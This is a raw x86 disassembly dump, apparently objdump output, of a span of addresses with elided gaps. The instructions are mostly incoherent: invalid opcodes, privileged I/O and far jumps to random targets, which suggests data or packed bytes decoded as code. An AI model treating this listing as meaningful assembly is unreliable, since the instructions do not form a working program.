  42b3b2:	cmp    edx,esi
  42b3b4:	adc    bh,0xfd
  42b3b7:	test   DWORD PTR [eax],0x177fb2b1
  42b3bd:	push   esp
  42b3be:	or     al,0xe2
  42b3c0:	jle    0x42b398
  42b3c2:	adc    DWORD PTR [eax+0x3d116560],edx
  42b3c8:	mov    cs,WORD PTR [ecx+0x3a]
  42b3cb:	and    cl,BYTE PTR [esi+edi*2-0x2f5b4ceb]
  42b3d2:	loop   0x42b452
  42b3d4:	xor    ecx,esp
  42b3d6:	lahf   
  42b3d7:	ins    BYTE PTR es:[edi],dx
  42b3d8:	repz mov dh,0xba
  42b3db:	push   ecx
  42b3dc:	jle    0x42b3ad
  42b3de:	add    DWORD PTR [edx+0x4733112b],edi
  42b3e4:	sar    BYTE PTR [bp+di-0x54],1
  42b3e8:	xchg   ebx,eax
  42b3e9:	stos   BYTE PTR es:[edi],al
  42b3ea:	add    DWORD PTR [ecx],0xba9cc3e9
  42b3f0:	cmp    bl,0x1b
  42b3f3:	loop   0x42b472
  42b3f5:	icebp  
  42b3f6:	sti    
  42b3f7:	sub    cl,bh
  42b3f9:	pop    ebp
  42b3fa:	enter  0x1d67,0xa4
  42b3fe:	lods   al,BYTE PTR ds:[esi]
  42b3ff:	pop    ss
  42b400:	clc    
  42b401:	jecxz  0x42b426
  42b403:	mov    edi,0xfe15684c
  42b408:	ret    0xb6e6
  42b40b:	lea    esi,ds:[ebp-0x3cf49183]
  42b412:	je     0x42b3f9
  42b414:	jb     0x42b427
  42b416:	shr    BYTE PTR ss:[esi],0xf5
  42b41a:	loopne 0x42b3a4
  42b41c:	mov    bl,0x1d
  42b41e:	adc    esp,DWORD PTR [eax+0x8]
  42b421:	xchg   esi,eax
  42b422:	jl     0x42b3c4
  42b424:	(bad)  
  42b425:	jo     0x42b3b8
  42b427:	test   DWORD PTR [ebp+ecx*8+0x71],ebp
  42b42b:	add    eax,0x5de2c7ba
  42b430:	mov    esi,eax
  42b432:	xchg   ebx,eax
  42b433:	stos   BYTE PTR es:[edi],al
  42b434:	pushf  
  42b435:	or     BYTE PTR [esi],dl
  42b437:	rcl    DWORD PTR [ecx+esi*2],0x62
  42b43b:	cmp    BYTE PTR [edx+0x7c6dad5a],0x1e
  42b442:	jl     0x42b3e1
  42b444:	xchg   ebp,edi
  42b446:	ja     0x42b496
  42b448:	ret    0x68c9
  42b44b:	stos   DWORD PTR es:[edi],eax
  42b44c:	int    0x59
  42b44e:	dec    edi
  42b44f:	ffree  st(4)
  42b451:	int    0x47
  42b453:	data16 into 
  42b455:	cmc    
  42b456:	mov    ds:0x545abf12,al
  42b45b:	jecxz  0x42b440
  42b45d:	ja     0x42b46c
  42b45f:	scas   eax,DWORD PTR es:[edi]
  42b460:	(bad)  
  42b461:	xor    eax,0x41663208
  42b466:	ret    
  42b467:	dec    BYTE PTR [esi+0x2f]
  42b46a:	in     al,dx
  42b46b:	retf   0xa0fa
	...
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [eax+edx*4-0x50],eax
  42b4e5:	dec    edi
  42b4e6:	rol    BYTE PTR [bx+di],1
  42b4e9:	add    BYTE PTR [eax],al
  42b4eb:	add    DWORD PTR [eax],eax
  42b4ed:	add    BYTE PTR [edi-0x71],bh
  42b4f0:	cld    
  42b4f1:	inc    edi
  42b4f2:	repz cmp esi,ebx
  42b4f5:	and    BYTE PTR [esi],bh
  42b4f7:	inc    ecx
  42b4f8:	aad    0xf1
  42b4fa:	retf   
  42b4fb:	in     al,0x5d
  42b4fd:	test   BYTE PTR [esi-0x3d3e2b59],cl
  42b503:	jecxz  0x42b4e6
  42b505:	pop    ds
  42b506:	mov    dh,0xaf
  42b508:	(bad)  
  42b509:	iret   
  42b50a:	jmp    0xd59f:0xe0c752f
  42b511:	js     0x42b4b3
  42b513:	adc    DWORD PTR [ebx],ecx
  42b515:	xor    ebx,esi
  42b517:	loop   0x42b50e
  42b519:	add    BYTE PTR [ecx+edi*2-0x1a],ch
  42b51d:	mov    BYTE PTR es:0xa5b1ed86,ah
  42b524:	pop    ss
  42b525:	and    eax,0x11ee2cdc
  42b52a:	inc    ebp
  42b52b:	cwde   
  42b52c:	mov    ?,WORD PTR [ecx-0x37]
  42b52f:	mov    edi,0x17a5f939
  42b534:	mov    bl,0x46
  42b536:	stc    
  42b537:	dec    edi
  42b538:	mov    ah,0x98
  42b53a:	iret   
  42b53b:	outs   dx,BYTE PTR ds:[esi]
  42b53c:	(bad)  [edi-0x7f8b38c6]
  42b542:	test   BYTE PTR [ecx],ah
  42b544:	in     eax,dx
  42b545:	lods   eax,DWORD PTR ds:[esi]
  42b546:	clc    
  42b547:	sbb    edx,DWORD PTR [edi]
  42b549:	dec    esi
  42b54a:	outs   dx,DWORD PTR ds:[esi]
  42b54b:	add    DWORD PTR es:[esi+0x30d662de],esp
  42b552:	daa    
  42b553:	mov    eax,ds:0x700816
  42b558:	mov    eax,ds:0xf86baa7b
  42b55d:	mov    cl,0x52
  42b55f:	sbb    BYTE PTR [esi+0x40],ch
  42b562:	push   esp
  42b563:	retf   
  42b564:	mov    ebx,0x1066583c
  42b569:	int3   
  42b56a:	loopne 0x42b550
  42b56c:	sar    DWORD PTR [edi+0x58],1
  42b56f:	je     0x42b551
  42b571:	ret    0xbcac
  42b574:	mov    edx,0xa8335e15
  42b579:	push   DWORD PTR [edx]
  42b57b:	add    DWORD PTR [edx],ebp
  42b57d:	rol    DWORD PTR fs:[eax+0x6f06984e],cl
  42b584:	cs js  0x42b602
  42b587:	jae    0x42b562
  42b589:	add    eax,0xf01118c5
  42b58e:	mov    eax,0x12db8202
  42b593:	stos   BYTE PTR es:[edi],al
  42b594:	sbb    edx,eax
  42b596:	out    0xfb,eax
  42b598:	inc    esi
  42b599:	mov    ebx,0xbb1df1b4
  42b59e:	mov    esp,ss
  42b5a0:	sub    al,0xf
  42b5a2:	mov    edx,DWORD PTR [edi]
  42b5a4:	jecxz  0x42b555
  42b5a6:	dec    ebx
  42b5a7:	out    dx,eax
  42b5a8:	imul   DWORD PTR [ecx]
  42b5aa:	out    dx,al
  42b5ab:	xor    bh,al
  42b5ad:	stc    
  42b5ae:	out    0x70,al
  42b5b0:	dec    ebp
  42b5b1:	and    BYTE PTR [edi+0x6d],ch
  42b5b4:	repnz inc esp
  42b5b6:	adc    ch,BYTE PTR ds:0x82a6f7b4
  42b5bc:	test   DWORD PTR [ecx-0x72],edi
  42b5bf:	dec    ebp
  42b5c0:	call   0x65f5:0x77a44044
  42b5c7:	sub    BYTE PTR [ecx-0x71828db],bl
  42b5cd:	and    BYTE PTR [edx+0x0],al
  42b5d0:	repnz in al,dx
  42b5d2:	retf   
  42b5d3:	jns    0x42b5d5
  42b5d5:	sub    eax,0xd86992c8
  42b5da:	inc    esi
  42b5db:	lds    ecx,FWORD PTR [esi]
  42b5dd:	(bad)  
  42b5de:	adc    al,0xbf
  42b5e0:	mov    BYTE PTR [edi+0x5],ah
  42b5e3:	loop   0x42b663
  42b5e5:	or     dl,BYTE PTR [ebp-0x29]
  42b5e8:	xor    al,BYTE PTR [eax]
  42b5ea:	mov    eax,ds:0x7c1a79
	...
  42b653:	add    BYTE PTR [eax],al
  42b655:	add    al,ah
  42b657:	xchg   esp,eax
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	push   0x58
  42b664:	push   edi
  42b665:	mov    bh,0x67
  42b667:	rol    DWORD PTR [ecx],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [eax-0x4e21b51a],bl
  42b673:	or     edx,DWORD PTR [esi-0x4b]
  42b676:	(bad)  
  42b677:	mov    al,ds:0xe6a0a0d7
  42b67c:	mov    edx,0x3ff010a7
  42b681:	inc    edi
  42b682:	and    ebp,DWORD PTR [edi-0x562d0354]
  42b688:	cld    
  42b689:	mov    cl,0x62
  42b68b:	int    0xcc
  42b68d:	cmp    al,0x9b
  42b68f:	xchg   ebx,eax
  42b690:	mov    bl,0x94
  42b692:	pop    es
  42b693:	aad    0xc0
  42b695:	mov    dl,0x7d
  42b697:	pop    edx
  42b698:	lahf   
  42b699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b69a:	xor    BYTE PTR [edx+edi*8-0x6bdeb1fe],bh
  42b6a1:	and    dl,BYTE PTR [eax-0x10]
  42b6a4:	rol    edi,1
  42b6a6:	jmp    0xbda8:0xa4680d34
  42b6ad:	lds    eax,FWORD PTR ds:[edx+0x1a]
  42b6b1:	outs   dx,DWORD PTR ds:[esi]
  42b6b2:	addr16 sahf 
  42b6b4:	pop    edi
  42b6b5:	pop    esp
  42b6b6:	or     bl,bl
  42b6b8:	rcr    BYTE PTR [ebx-0x3f5b037],cl
  42b6be:	adc    al,ah
  42b6c0:	mov    ?,WORD PTR [esp+eax*4-0x3c727fce]
  42b6c7:	out    dx,al
  42b6c8:	arpl   si,di
  42b6ca:	or     DWORD PTR [edx+ebx*4],0x74
  42b6ce:	fiadd  DWORD PTR [eax-0x1dc7636f]
  42b6d4:	xchg   esp,eax
  42b6d5:	add    DWORD PTR [eax-0x40],ebx
  42b6d8:	loope  0x42b72d
  42b6da:	pop    esi
  42b6db:	shl    DWORD PTR [ebx+0x2b],1
  42b6de:	inc    ebx
  42b6df:	in     al,dx
  42b6e0:	jo     0x42b734
  42b6e2:	adc    al,0x2f
  42b6e4:	mov    ebx,0xa156f9b4
  42b6e9:	clc    
  42b6ea:	pop    ds
  42b6eb:	mov    esp,0x82d0bc40
  42b6f0:	(bad)  
  42b6f3:	stos   DWORD PTR es:[edi],eax
  42b6f4:	xchg   ebx,eax
  42b6f5:	icebp  
  42b6f6:	mul    BYTE PTR [eax+0x2a]
  42b6f9:	leave  
  42b6fa:	adc    al,0xd9
  42b6fc:	sbb    esp,edx
  42b6fe:	pop    edx
  42b6ff:	jge    0x42b753
  42b701:	test   BYTE PTR [ecx-0x73a09e],dl
  42b707:	cli    
  42b708:	pusha  
  42b709:	xchg   edi,eax
  42b70a:	xor    ebx,DWORD PTR [edi+0x7a350d54]
  42b710:	imul   ebp,DWORD PTR [edi-0xf],0xeb32c798
  42b717:	xor    eax,0x513109dc
  42b71c:	(bad)  
  42b71d:	ins    DWORD PTR es:[edi],dx
  42b71e:	mov    ?,WORD PTR [ebx]
  42b720:	fwait
  42b721:	mov    eax,ds:0x52ea233e
  42b726:	adc    edx,ebx
  42b728:	les    edx,FWORD PTR [eax+0x48]
  42b72b:	lock aam 0x13
  42b72e:	push   ebx
  42b72f:	sar    DWORD PTR [ebx+0x2b52881a],cl
  42b735:	inc    ecx
  42b736:	fldcw  WORD PTR [ebp-0x78]
  42b739:	push   edx
  42b73a:	nop
  42b73b:	stos   DWORD PTR es:[edi],eax
  42b73c:	push   esi
  42b73d:	push   esi
  42b73e:	or     BYTE PTR ds:0x546fba1,al
  42b744:	jb     0x42b760
  42b746:	and    esp,DWORD PTR [edi-0x7fb06cff]
  42b74c:	jns    0x42b74e
  42b74e:	cmc    
  42b74f:	pop    ds
  42b750:	cmp    eax,0x328afa62
  42b755:	dec    esp
  42b756:	cmp    BYTE PTR [edx],cl
  42b758:	icebp  
  42b759:	sbb    BYTE PTR [eax-0x61eb0873],bl
  42b75f:	pop    esi
  42b760:	mov    al,ds:0x57d5871c
  42b765:	dec    ecx
  42b766:	cmp    ch,dh
  42b768:	inc    ecx
  42b769:	jb     0x42b743
  42b76b:	xchg   ebx,eax
  42b76c:	in     al,0xf
	...
  42b7d6:	dec    esi
  42b7d7:	inc    edx
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	icebp  
  42b7e3:	dec    esi
  42b7e4:	push   edi
  42b7e5:	sbb    DWORD PTR [edi-0x2e],esp
  42b7e8:	add    DWORD PTR [eax],eax
  42b7ea:	add    BYTE PTR [ecx],al
  42b7ec:	add    BYTE PTR [eax],al
  42b7ee:	arpl   WORD PTR [esi+0x5c],di
  42b7f1:	inc    edi
  42b7f2:	dec    esi
  42b7f3:	or     eax,0x5f555c5c
  42b7f8:	sbb    al,0x19
  42b7fa:	loop   0x42b865
  42b7fc:	mov    dl,0x4e
  42b7fe:	repnz loop 0x42b7a4
  42b801:	ja     0x42b79a
  42b803:	or     eax,0x52ae75e
  42b808:	shr    BYTE PTR [ebp+0x4c],1
  42b80b:	lahf   
  42b80c:	push   0x1b
  42b80e:	ja     0x42b7a4
  42b810:	jecxz  0x42b857
  42b812:	hlt    
  42b813:	sub    DWORD PTR [ebx+0x33e04410],esi
  42b819:	sub    al,0x56
  42b81b:	and    eax,0x7864f63b
  42b820:	les    esi,FWORD PTR [ecx-0x6f7b2ccb]
  42b826:	xchg   ebp,eax
  42b827:	clc    
  42b828:	inc    ebp
  42b829:	and    BYTE PTR [eax-0x66f16636],0x4f
  42b830:	and    DWORD PTR [edx+0x3b],ebx
  42b833:	mov    al,ds:0xf24ead5e
  42b838:	outs   dx,DWORD PTR ds:[esi]
  42b839:	out    0xb6,al
  42b83b:	into   
  42b83c:	cmc    
  42b83d:	add    al,0x61
  42b83f:	inc    edx
  42b840:	dec    ecx
  42b841:	mov    dl,0x18
  42b843:	fstsw  WORD PTR [edi+0x17da4f5d]
  42b84a:	dec    esi
  42b84b:	fimul  DWORD PTR [edi-0x120585c7]
  42b851:	test   DWORD PTR [esi+0x4b],0x24758b8b
  42b858:	out    dx,eax
  42b859:	jle    0x42b7f9
  42b85b:	cld    
  42b85c:	hlt    
  42b85d:	jmp    0xd29a145d
  42b862:	jle    0x42b8dd
  42b864:	jo     0x42b838
  42b866:	sbb    BYTE PTR [ecx],cl
  42b868:	xchg   edx,eax
  42b869:	fstp   QWORD PTR [ecx+0x2d]
  42b86c:	fstp   TBYTE PTR [edx-0x39fccf72]
  42b872:	xchg   ecx,eax
  42b873:	fisttp WORD PTR [esi]
  42b875:	clc    
  42b876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b877:	(bad)  
  42b878:	lods   eax,DWORD PTR ds:[esi]
  42b879:	aad    0x7b
  42b87b:	xchg   edx,eax
  42b87c:	fcmovu st,st(2)
  42b87e:	mov    dl,0xee
  42b880:	jne    0x42b84f
  42b882:	call   0x20e97f75
  42b887:	jnp    0x42b905
  42b889:	dec    esi
  42b88a:	mov    WORD PTR [edi-0x39],?
  42b88d:	adc    ah,BYTE PTR [ebx]
  42b88f:	js     0x42b90f
  42b891:	dec    esp
  42b892:	or     BYTE PTR [edi+eax*4-0x66],0x59
  42b897:	sub    DWORD PTR [edi+ecx*1+0x372a7f4b],ebp
  42b89e:	push   esp
  42b89f:	pop    ds
  42b8a0:	xchg   ebx,ebp
  42b8a2:	pop    ss
  42b8a3:	js     0x42b838
  42b8a5:	and    DWORD PTR fs:[esi-0x3f],eax
  42b8a9:	shl    DWORD PTR [edi+0x3d],1
  42b8ac:	inc    edi
  42b8ad:	xor    eax,0x2a60fefb
  42b8b2:	inc    edi
  42b8b3:	fdivrp st(1),st
  42b8b5:	mov    ds:0xffd14a92,eax
  42b8ba:	bound  edx,QWORD PTR [esi]
  42b8bc:	jp     0x42b872
  42b8be:	xchg   edx,eax
  42b8bf:	inc    ebx
  42b8c0:	mov    ah,0x62
  42b8c2:	jmp    0xed25974a
  42b8c7:	xchg   edx,eax
  42b8c8:	sahf   
  42b8c9:	outs   dx,DWORD PTR ds:[esi]
  42b8ca:	or     eax,0x900108c9
  42b8cf:	and    edi,DWORD PTR [edx-0x27]
  42b8d2:	aad    0x5b
  42b8d4:	ror    BYTE PTR ds:[ecx+0x6a653efd],cl
  42b8db:	mov    esi,0xc14deee6
  42b8e0:	xor    BYTE PTR [ecx],bl
  42b8e2:	wbinvd 
  42b8e4:	push   0xfffffff7
  42b8e6:	sub    eax,0x6078a64d
  42b8eb:	pushf  
  42b8ec:	mov    ?,WORD PTR [ebp+0x0]
	...
  42b956:	call   0x2a77f8
  42b95b:	out    0xf9,eax
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     eax,ebp
  42b963:	pop    es
  42b964:	dec    eax
  42b965:	inc    ebx
  42b966:	rol    DWORD PTR [bx+di],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    bh,ah
  42b96f:	ror    ah,cl
  42b971:	mov    ebp,0x834a72b6
  42b976:	gs call esi
  42b979:	mov    bh,0x65
  42b97b:	mov    dl,BYTE PTR [ebx]
  42b97d:	add    DWORD PTR [edi+0x78],0xffffff83
  42b981:	sbb    ch,0x1d
  42b984:	inc    ebx
  42b985:	loop   0x42b949
  42b987:	imul   esp,DWORD PTR [edx],0xc01eb004
  42b98d:	aas    
  42b98e:	sub    DWORD PTR [ecx-0x20],esp
  42b991:	out    0x37,al
  42b993:	pusha  
  42b994:	shl    BYTE PTR [esp+ebx*1],cl
  42b997:	rcl    bh,0x2c
  42b99a:	push   eax
  42b99b:	fbld   TBYTE PTR [ecx]
  42b99d:	dec    edi
  42b99e:	(bad)  
  42b99f:	aad    0xd3
  42b9a1:	inc    ecx
  42b9a2:	pusha  
  42b9a3:	call   0x1f8a:0x5429c151
  42b9aa:	aaa    
  42b9ab:	or     eax,0x3b20a1ef
  42b9b0:	out    dx,al
  42b9b1:	dec    ebx
  42b9b2:	pop    ebp
  42b9b3:	or     eax,DWORD PTR [ebx-0x69]
  42b9b6:	stos   BYTE PTR es:[edi],al
  42b9b7:	mov    cl,0xd
  42b9b9:	push   ebp
  42b9ba:	adc    edi,DWORD PTR [ecx+0x10]
  42b9bd:	push   edi
  42b9be:	push   edi
  42b9bf:	fistp  WORD PTR [esi+0x54]
  42b9c2:	push   0xd8f6db21
  42b9c7:	dec    edx
  42b9c8:	test   DWORD PTR [ecx],esp
  42b9ca:	sbb    edi,DWORD PTR ds:0x70126af0
  42b9d0:	sbb    eax,0x288f5bfb
  42b9d5:	outs   dx,DWORD PTR ds:[esi]
  42b9d6:	sub    BYTE PTR [esi-0x67ca7860],dh
  42b9dc:	int3   
  42b9dd:	xlat   BYTE PTR ds:[ebx]
  42b9de:	(bad)  
  42b9df:	in     eax,0xda
  42b9e1:	cli    
  42b9e2:	mov    ds:0x68838363,al
  42b9e7:	add    dh,al
  42b9e9:	jns    0x42ba48
  42b9eb:	jne    0x42b9a3
  42b9ed:	retf   
  42b9ee:	das    
  42b9ef:	fsub   DWORD PTR [edx-0x2c]
  42b9f2:	jnp    0x42b9da
  42b9f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b9f5:	sti    
  42b9f6:	mov    ds:0x12c3a032,al
  42b9fb:	jp     0x42b9cd
  42b9fd:	or     ebx,DWORD PTR [edi-0x41]
  42ba00:	inc    edi
  42ba01:	jmp    0xf86d:0xf9039e87
  42ba08:	out    dx,al
  42ba09:	pop    ecx
  42ba0a:	mov    edi,0xb074accd
  42ba0f:	sub    bl,al
  42ba11:	add    ah,BYTE PTR [eax]
  42ba13:	xchg   esi,eax
  42ba14:	xor    edx,edi
  42ba16:	pop    es
  42ba17:	xor    esp,ebp
  42ba19:	retf   0xc1d5
  42ba1c:	out    0xcf,al
  42ba1e:	jae    0x95ed5c2f
  42ba24:	mov    WORD PTR [edi],es
  42ba26:	xor    ecx,DWORD PTR [edi-0x2c92dd9a]
  42ba2c:	cmp    eax,0x8976b151
  42ba31:	imul   esp,DWORD PTR [eax],0xffffffc0
  42ba34:	outs   dx,DWORD PTR ds:[esi]
  42ba35:	cmp    DWORD PTR [ecx+eax*1],esi
  42ba38:	xchg   ebx,eax
  42ba39:	cmp    BYTE PTR [edx+0x76],bl
  42ba3c:	out    dx,eax
  42ba3d:	das    
  42ba3e:	push   0xffffff8e
  42ba40:	and    eax,0x18a7cdab
  42ba45:	ins    DWORD PTR es:[edi],dx
  42ba46:	shl    BYTE PTR [edi],0x48
  42ba49:	inc    eax
  42ba4a:	pop    esp
  42ba4b:	and    eax,0xf7d34d10
  42ba50:	xchg   esp,eax
  42ba51:	lds    esi,FWORD PTR [ecx]
  42ba53:	(bad)  
  42ba54:	cli    
  42ba55:	aaa    
  42ba56:	test   al,0x53
  42ba58:	add    eax,0xeabb150b
  42ba5d:	pop    esi
  42ba5e:	or     al,0x59
  42ba60:	xchg   ebp,eax
  42ba61:	std    
  42ba62:	stos   DWORD PTR es:[edi],eax
  42ba63:	inc    ecx
  42ba64:	inc    edx
  42ba65:	and    eax,DWORD PTR [ebx+0x3a]
  42ba68:	hlt    
  42ba69:	push   cs
  42ba6a:	mov    esp,es
  42ba6c:	js     0x42bad0
	...
  42bad6:	mov    eax,DWORD PTR [edi]
  42bad8:	mov    al,0xe2
  42bada:	mov    esp,0x6a6fdbf7
  42badf:	pop    ebx
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [edx-0x63],eax
  42bae4:	and    eax,0x1d467ea
  42bae9:	add    BYTE PTR [eax],al
  42baeb:	add    DWORD PTR [eax],eax
  42baed:	add    BYTE PTR [ecx],dh
  42baef:	cvttps2pi mm4,QWORD PTR [eax]
  42baf2:	test   DWORD PTR [ecx-0x4f5cb83a],ecx
  42baf8:	hlt    
  42baf9:	cld    
  42bafa:	ins    BYTE PTR es:[edi],dx
  42bafb:	adc    ecx,DWORD PTR [edi]
  42bafd:	mov    es,WORD PTR [ebx+0x78]
  42bb00:	stc    
  42bb01:	inc    ecx
  42bb02:	mov    ebx,0x899ec5de
  42bb07:	ret    0x1330
  42bb0a:	push   edx
  42bb0b:	sub    BYTE PTR [eax],cl
  42bb0d:	fiadd  DWORD PTR [ebp+0x21]
  42bb10:	jno    0x42baf9
  42bb12:	jb     0x42bb1e
  42bb14:	pushf  
  42bb15:	fdivr  DWORD PTR [ecx-0x36dfd08d]
  42bb1b:	mov    BYTE PTR [edi],bl
  42bb1d:	fdiv   QWORD PTR [ecx-0x5061b29f]
  42bb23:	lock or eax,0x12599124
  42bb29:	sbb    eax,0x47a50b24
  42bb2e:	jns    0x42bb00
  42bb30:	in     al,dx
  42bb31:	test   DWORD PTR [ebp+0x20],eax
  42bb34:	addr16 mov edx,0xe2bd0305
  42bb3a:	ss mov cl,0x45
  42bb3d:	sbb    eax,0xa4b54126
  42bb42:	jne    0x42baea
  42bb44:	xchg   ebp,eax
  42bb45:	or     eax,0x27af79d2
  42bb4a:	inc    ecx
  42bb4b:	mov    esp,0xcf1c71c2
  42bb50:	(bad)  
  42bb51:	pop    esp
  42bb52:	push   0x5a
  42bb54:	test   DWORD PTR [edi+edx*8],esp
  42bb57:	sbb    al,0x24
  42bb59:	inc    esi
  42bb5a:	push   0xbe02c86d
  42bb5f:	neg    BYTE PTR [edx]
  42bb61:	sar    al,0x8a
  42bb64:	dec    ecx
  42bb65:	(bad)  
  42bb67:	cwde   
  42bb68:	gs loopne 0x42bb9c
  42bb6b:	pop    ebp
  42bb6c:	js     0x42baf6
  42bb6e:	rcl    DWORD PTR [ebp+ebx*8-0x73],1
  42bb72:	push   esi
  42bb73:	test   DWORD PTR [ecx],eax
  42bb75:	(bad)  
  42bb76:	xchg   edi,eax
  42bb77:	inc    edx
  42bb78:	shr    BYTE PTR [esp+eax*2],0x25
  42bb7c:	mov    bh,0xcb
  42bb7e:	test   edx,edi
  42bb80:	inc    BYTE PTR [edi+edx*4+0x4619c42a]
  42bb87:	int    0xcb
  42bb89:	cwde   
  42bb8a:	cmp    BYTE PTR [edi-0x4cc669d8],al
  42bb90:	jl     0x42bb7b
  42bb92:	push   ebx
  42bb93:	cmp    eax,0xe00eace1
  42bb98:	inc    DWORD PTR [esi-0x2ebaa1dd]
  42bb9e:	lock mov eax,0xb49fa965
  42bba4:	je     0x42bb5b
  42bba6:	push   0x48156fc8
  42bbab:	ror    DWORD PTR [eax-0x31],1
  42bbae:	idiv   BYTE PTR [esi+0x6b]
  42bbb1:	call   0xe4b9:0xebaa421d
  42bbb8:	inc    esi
  42bbb9:	cmc    
  42bbba:	loope  0x42bc27
  42bbbc:	sub    al,0xd2
  42bbbe:	fbld   TBYTE PTR [eax-0x11a7794]
  42bbc4:	mov    DWORD PTR [esp+edx*8],ecx
  42bbc7:	addr16 xchg edx,eax
  42bbc9:	cmc    
  42bbca:	cmp    eax,0x3e5219eb
  42bbcf:	cmp    esi,ebp
  42bbd1:	push   ss
  42bbd2:	inc    edi
  42bbd3:	dec    ecx
  42bbd4:	lahf   
  42bbd5:	mov    esi,0x6eb7c41c
  42bbda:	adc    BYTE PTR [edi-0x3f],bl
  42bbdd:	xlat   BYTE PTR ds:[ebx]
  42bbde:	cld    
  42bbdf:	jae    0x42bb67
  42bbe1:	sub    ch,cl
  42bbe3:	sahf   
  42bbe4:	sar    DWORD PTR ds:0x1a218791,1
  42bbea:	xchg   ebp,eax
  42bbeb:	cmp    al,0xdf
  42bbed:	mov    eax,ds:0x0
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	dec    ebx
  42bc63:	jge    0x42bc83
  42bc65:	pop    es
  42bc66:	addr16 aad 0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    BYTE PTR [edi-0x5b38a6ac],bl
  42bc73:	add    BYTE PTR [ebx-0x5457b25f],0xf0
  42bc7a:	sub    al,BYTE PTR [ebp-0x24f6aa3d]
  42bc80:	test   DWORD PTR [ecx-0x63d5c6ae],esp
  42bc86:	push   ds
  42bc87:	stos   DWORD PTR es:[edi],eax
  42bc88:	xlat   BYTE PTR ds:[ebx]
  42bc89:	jecxz  0x42bc76
  42bc8b:	pop    edi
  42bc8c:	mov    WORD PTR [ebx],?
  42bc8e:	or     DWORD PTR [esp+esi*8],ecx
  42bc91:	ins    DWORD PTR es:[edi],dx
  42bc92:	and    eax,0x36a00ff1
  42bc97:	ins    DWORD PTR es:[edi],dx
  42bc98:	rcr    BYTE PTR [edi+0x4fb28d48],0xe5
  42bc9f:	mov    WORD PTR ds:0x96cd134d,fs
  42bca5:	add    edi,esp
  42bca7:	test   eax,0x6fcfb7a8
  42bcac:	icebp  
  42bcad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bcae:	xor    edi,DWORD PTR [ebp-0x4d]
  42bcb1:	out    0x2,eax
  42bcb3:	aam    0xd8
  42bcb5:	pop    edx
  42bcb6:	mov    WORD PTR [ecx+edi*2],fs
  42bcb9:	in     eax,dx
  42bcba:	out    dx,al
  42bcbb:	dec    edx
  42bcbc:	loopne 0x42bcc6
  42bcbe:	push   ebp
  42bcbf:	adc    al,0xe0
  42bcc1:	push   ds
  42bcc2:	out    0xc8,al
  42bcc4:	xchg   edi,eax
  42bcc5:	loop   0x42bca5
  42bcc7:	in     eax,dx
  42bcc8:	sub    bl,dh
  42bcca:	add    ah,BYTE PTR [edi]
  42bccc:	call   0xcbcbc032
  42bcd1:	mov    ds:0x8cec115a,eax
  42bcd6:	outs   dx,BYTE PTR ds:[esi]
  42bcd7:	xchg   edi,eax
  42bcd8:	daa    
  42bcd9:	xchg   esp,eax
  42bcda:	out    dx,eax
  42bcdb:	test   al,0xe7
  42bcdd:	add    DWORD PTR [ecx-0x57808b8d],0x38c66e48
  42bce7:	or     DWORD PTR [ebp+0x7da61805],edx
  42bced:	push   ss
  42bcee:	das    
  42bcef:	xchg   ecx,eax
  42bcf0:	dec    ebp
  42bcf1:	mov    BYTE PTR [ebx+ebp*8],ch
  42bcf4:	in     al,0xf4
  42bcf6:	test   eax,0x2b9b5e0b
  42bcfb:	in     al,0x1
  42bcfd:	add    dl,BYTE PTR [ecx-0x70d02f34]
  42bd03:	sahf   
  42bd04:	popf   
  42bd05:	mov    WORD PTR [ebp+0x36],cs
  42bd08:	dec    ebx
  42bd09:	xor    bl,BYTE PTR [ecx]
  42bd0b:	dec    eax
  42bd0c:	adc    dl,BYTE PTR [edi-0x15]
  42bd0f:	std    
  42bd10:	sbb    eax,0xc69ce580
  42bd16:	push   0xc8370fec
  42bd1b:	jbe    0x42bd7b
  42bd1d:	lea    edx,ds:0x1d230f02
  42bd23:	(bad)  
  42bd25:	repz (bad) 
  42bd28:	mov    dl,0x9f
  42bd2a:	mov    ds:0xc9535e55,al
  42bd2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd30:	scas   eax,DWORD PTR es:[edi]
  42bd31:	xor    eax,0xb8084309
  42bd36:	(bad)  
  42bd37:	in     al,dx
  42bd38:	sub    ebp,DWORD PTR [edx]
  42bd3a:	push   ebp
  42bd3b:	stos   BYTE PTR es:[edi],al
  42bd3c:	add    DWORD PTR [esi-0x47135a21],ecx
  42bd42:	pop    edi
  42bd43:	mov    ds:0xaf9a4132,eax
  42bd48:	outs   dx,BYTE PTR ds:[esi]
  42bd49:	inc    eax
  42bd4a:	lahf   
  42bd4b:	sbb    eax,DWORD PTR [esp+esi*1-0x37]
  42bd4f:	or     eax,0x54f008f5
  42bd54:	iret   
  42bd55:	shl    dh,cl
  42bd57:	out    dx,al
  42bd58:	inc    ebx
  42bd59:	dec    esi
  42bd5a:	push   ebp
  42bd5b:	push   cs
  42bd5c:	push   ds
  42bd5d:	mov    esi,0xeeda7b39
